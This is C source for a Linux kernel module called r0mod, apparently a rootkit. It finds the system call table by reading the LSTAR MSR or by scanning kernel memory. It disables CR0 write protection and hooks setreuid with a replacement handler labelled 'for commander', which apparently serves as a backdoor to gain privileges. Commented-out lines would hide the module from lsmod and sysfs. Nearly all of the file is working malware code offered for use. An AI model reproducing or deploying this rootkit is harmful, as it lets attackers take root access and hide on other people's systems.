#include <linux/init.h>
#include <linux/kernel.h>

#include <asm/paravirt.h>   // write_cr0
#include <linux/unistd.h>   // syscalls
#include <linux/syscalls.h> // syscalls
#include <linux/capability.h>

#include <r0mod/global.h>

#define SEARCH_START    PAGE_OFFSET
#define SEARCH_END      ULONG_MAX //PAGE_OFFSET + 0xffffffff

unsigned long *sct;

struct
{
    unsigned long base;
    unsigned short limit;
} __attribute__ ((packed))idtr;

struct
{
    unsigned short off1;
    unsigned short off2;
    unsigned short sel;
    unsigned char none, flags;
} __attribute__ ((packed))idt;

unsigned long *find_sct(void)
{
    char **p;
    unsigned long sct_off = 0;
    unsigned char code[512];

    rdmsrl(MSR_LSTAR, sct_off);
    memcpy(code, (void *)sct_off, sizeof(code));

    p = (char **)memmem(code, sizeof(code), "\xff\x14\xc5", 3);

    if ( p )
    {
        unsigned long *sct = *(unsigned long **)((char *)p + 3);

        // Stupid compiler doesn't want to do bitwise math on pointers
        sct = (unsigned long *)(((unsigned long)sct & 0xffffffff) | 0xffffffff00000000);

        return sct;
    }
    else
        return NULL;
}

unsigned long *find_sct_by_addr_scan(void)
{
    unsigned long i;

    for(i = SEARCH_START; i < SEARCH_END; i += sizeof(void *))
    {
        unsigned long *sct = (unsigned long *)i;

        if(sct[__NR_close] == (unsigned long)sys_close)
            return sct;
    }

    return NULL;
}

static int __init r0mod_init(void)
{
    DEBUG("Module starting...\n");

    //DEBUG("Hiding module object.\n");
    //list_del_init(&__this_module.list);               // Remove from lsmod
    //kobject_del(&THIS_MODULE->mkobj.kobj);            // Remove from FS?
    //kobject_del(&THIS_MODULE->holders_dir->parent);   // Remove from FS?

    DEBUG("Search Start: %lx\n", SEARCH_START);
    DEBUG("Search End:   %lx\n", SEARCH_END);

    if((sct = (void *)find_sct()) == NULL)
        DEBUG("sct == NULL * 1\n");

    if(sct == NULL && (sct = (void *)find_sct_by_addr_scan()) == NULL)
    {
        DEBUG("sct == NULL * 2\n");
        return -1;
    }

    DEBUG("Search Found: sct @ %lx\n", (unsigned long)sct);

    DEBUG("Hooking setreuid for commander!\n");
    write_cr0(read_cr0() & (~0x10000));

    orig_setreuid = (void *)sct[__NR_setreuid];
    sct[__NR_setreuid] = (unsigned long)new_setreuid;

    write_cr0(read_cr0() | 0x10000);

    return 0;
}

static void __exit r0mod_exit(void)
{
    DEBUG("Module ending...!\n");

    if(sct != NULL)
    {
        write_cr0(read_cr0() & (~0x10000));

        sct[__NR_setreuid] = (unsigned long)orig_setreuid;

        write_cr0(read_cr0() | 0x10000);
    }
}

module_init(r0mod_init);
module_exit(r0mod_exit);

MODULE_LICENSE("GPL");
